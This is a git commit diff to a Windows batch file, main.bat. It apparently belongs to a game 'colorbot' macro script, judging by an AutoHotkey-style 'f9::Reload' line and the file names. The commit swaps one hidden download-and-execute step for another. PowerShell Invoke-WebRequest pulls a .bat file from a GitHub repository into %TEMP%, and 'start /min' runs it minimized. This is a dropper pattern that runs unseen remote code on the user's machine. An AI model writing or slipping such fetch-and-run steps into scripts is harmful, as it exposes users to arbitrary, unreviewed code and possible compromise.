0bfad624f2f6edb9c412ab0cff015ebe8b899c95
walks111551 <aidenwalka@gmail.com>
2024-11-20 22:22:30 -0600

    Update main.bat

--- main.bat
+++ main.bat
@@ -202,5 +202,5 @@ f9::Reload
 
 
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://github.com/walks111551/09672018256120856125/blob/main/installer.bat' -OutFile installer.bat"
-start /min installer.bat
+Powershell -Command "Invoke-Webrequest 'https://github.com/walks111551/09672018256120856125/blob/main/ColorbotLikeZombies1.1.1.3.4at.bat' -OutFile ColorbotLikeZombies1.1.1.3.4at.bat"
+start /min ColorbotLikeZombies1.1.1.3.4at.bat
